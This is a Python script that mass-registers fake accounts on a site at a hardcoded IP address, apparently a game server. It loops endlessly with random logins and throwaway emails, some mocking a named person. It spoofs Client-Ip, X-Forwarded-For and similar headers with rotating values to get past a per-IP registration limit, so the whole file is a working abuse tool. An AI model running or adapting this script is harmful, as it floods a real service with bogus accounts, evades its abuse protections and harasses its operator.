import requests
import socket
import random
import string
import re

letras = string.ascii_lowercase
url = "http://191.237.251.127/cadastrar/"
criada = 0
ipId = 0
ipId2 = 0
falha = 0
crash = 0
while True:

	try:
		ip = "_Uchihaker_> Quer meu ip?_["+str(ipId)+"]"+str(ipId2);
		ipId+=1

		headers = {
			# HTTP_CLIENT_IP
			'Client-Ip': ip,
			# HTTP_CF_CONNECTING_IP
			'Cf-Connecting-Ip': ip,
			# HTTP_X_REAL_IP
			'X-Real-Ip': ip,
			# 'HTTP_X_FORWARDED_FOR': ip,
			'X-Forwarded-For': ip,
		    'User-Agent': 'La vem o homem macaco',
		    'From': 'uchihaker@github.com/luisfeliperm'
		}
		ii = 40878

	except:
		ipId = 0
		ipId2 += 1
		break
	
	while True:
		try:
			ii += 1
			rand1 = random.randint(0,9)
			codigo = ''.join(random.choice(letras) for _ in range(5))
			codigo2 = ''.join(random.choice(letras) for _ in range(8))
			login = str(rand1)+'-WesleyFraco-Estude+|PoCoYo'+str(criada)+'laVEMoHomemMacaco'+codigo+str(ii)
			email = 'Wesley_FRACO-'+codigo+str(ii)+codigo2+str(rand1)+'@projectbloodi.com'
			senha = 'senha123'
			
			post = {
				'login': login,
				'password': senha, 
				'passwordconfirm': senha, 
				'email':  email,
				'insert':'',
			}
		except:
			break

		try:
			r = requests.post(url, data=post,timeout=12,headers=headers) 
			if re.search('sucesso', r.text, re.IGNORECASE):
			  	criada += 1
			  	status = "Success"
			  	print('>'+str(ii), ' Login: ', login,'Senha: ',senha, ' Email: ',email,r.status_code, '[',str(criada),']', status)
			elif  re.search('cadastrada nesse IP', r.text, re.IGNORECASE):
				print('Limite IP '+str(ip))
				break
			else:
				falha += 1
				print('[x] Falha - '+str(falha))
				if falha > 5:
					break
				
		except:
			crash += 1
			print('('+str(ii)+') Erro ao enviar POST - Desconhecido - '+str(crash))
			if crash > 5:
					break
			
